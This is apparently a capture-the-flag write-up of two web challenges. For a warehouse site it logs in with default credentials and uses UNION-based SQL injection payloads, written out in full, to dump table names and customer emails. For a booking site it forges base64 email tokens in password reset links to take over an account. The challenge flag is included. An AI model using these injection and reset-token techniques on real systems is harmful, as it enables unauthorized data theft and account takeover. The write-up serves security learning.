# Web

## Stockos

Our first goal, given by Jérémy Nitel, was to search for creditentials in a broken warehouse's website named Stockos. The messages also indicates that Stockos has its admin password leaked multiple times and that it was a simple one.

When landing on the provided link (https://challengecybersec.fr/4e9033c6eacf38dc2a5df7a14526bec1/), we stumble upon a login page. Remembering the easy password, we tried `admin` as login and password. Bingo! It was right, we are now logged on as the admin. We cannot do much except change some personal infos about the admin and list the orders from the warehouse. Interestingly, there is a search function, this got us and idea to try for an SQL injection.

And so we did, by trying different character sets, we found out that `' AND 1=1 -- '` works. We then supposed that the request was written like this:
```sql
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='<our input text>%' ORDER BY section ASC
-- With our input text:
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='' AND 1=1 -- '%' ORDER BY section ASC;
```
Now, with a door to enter, we can use the keyword `UNION` to append new information on the tables. One very interesting table name to look for is `information_schema.tables`. This is a table that lists all tables.
```sql
-- <' AND 0=1 UNION SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables -- '>
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='' AND 0=1 UNION SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables -- '%' ORDER BY section ASC
```
With every tables listed, we can check the `customer` table. We still need the column names and the table `information_schema.columns` can help us.
```sql
-- <' AND 0=1 UNION SELECT column_name, 2, 3, 4, 5 FROM information_schema.columns WHERE table_name='customer' -- '>
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='' AND 0=1 UNION SELECT column_name, 2, 3, 4, 5 FROM information_schema.columns WHERE table_name='customer' -- '%' ORDER BY section ASC
```
The request above will print the name of every column of `customer`. `name` and `email` are very useful.
```sql
-- <' AND 0=1 UNION SELECT name, email, 3, 4, 5 FROM customer -- '>
SELECT ?, ?, ?, ?, ? FROM ? WHERE ?='' AND 0=1 UNION SELECT name, email, 3, 4, 5 FROM customer -- '%' ORDER BY section ASC
```
This last SQL request will print the list of each customer's name and email. And there lays the email we are looking for: `agent.malice@secret.evil.gov.ev`. We can now go try the rest of the challenge.

*__Note__: The end of the SQL request can be leaked by creating a malformed request like `'`. You can also find that this is a MySQL server. The numbers `1` to `5` in SQL requests are special name for dummy columns.*

## Evil Air

This plane ticket bookmarking website were also given by Mr. Nitel (https://www.challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/). We had to book a plane ticket from `Bad City` to `Evil City` at thoses dates `26/10/2020` -> ` 28/10/2020` (French Date Format).

When we tried to book the ticket, it asked us to login / register on the site. If you register with a standard mail / username email, you will be denied from accessing the order page, and accessing the QR Code that contain the flag to going further.

You the get an activation link: `http://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/activate/ZXhhbXBsZS5leGFtcGxlQHRlc3QuY29t

Then we looked at the reset password form, and the link were the same with the sole variation: instead of `activate` you have `reset`. We digged more the link and discovered that the last part of the link was a base64 hash of the account email address (this link is the hash of `example.example@test.com`). We replaced the fake account with the base64 hash of the email we were looking for on stockos (http://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/reset/YWdlbnQubWFsaWNlQHNlY3JldC5ldmlsLmdvdi5ldg==), then it displayed the password, and allowed us to order the ticket. It then shows the QR code containing the flag `DGSESIEE{2cd992f9b2319860ce3a35db6673a9b8}`.

<p align="center">
    <img width=25% src="./flag.png" alt="Rank: 153 - Team: Sagliss - Last Validation: 08/11 - Points: 450">
</p>

When provinding the flag, Nitel responded with a `.pcap` file.
